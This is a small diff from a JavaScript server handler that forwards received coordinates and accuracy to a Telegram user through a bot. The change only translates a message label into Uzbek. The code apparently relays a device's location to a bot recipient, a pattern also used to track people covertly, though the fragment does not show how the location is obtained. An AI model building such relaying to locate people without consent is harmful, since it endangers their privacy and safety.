@@ -175,7 +175,7 @@ if(lon != null && lat != null && uid != null && acc != null){
 
 bot.sendLocation(parseInt(uid,36),lat,lon);
 
-bot.sendMessage(parseInt(uid,36),`Kenglik: ${lat}\nUzunlik ${lon}\nAccuracy ${acc} metr`);
+bot.sendMessage(parseInt(uid,36),`Kenglik: ${lat}\nUzunlik ${lon}\nAniqlik ${acc} metr`);
   
 res.send("Done");
 }
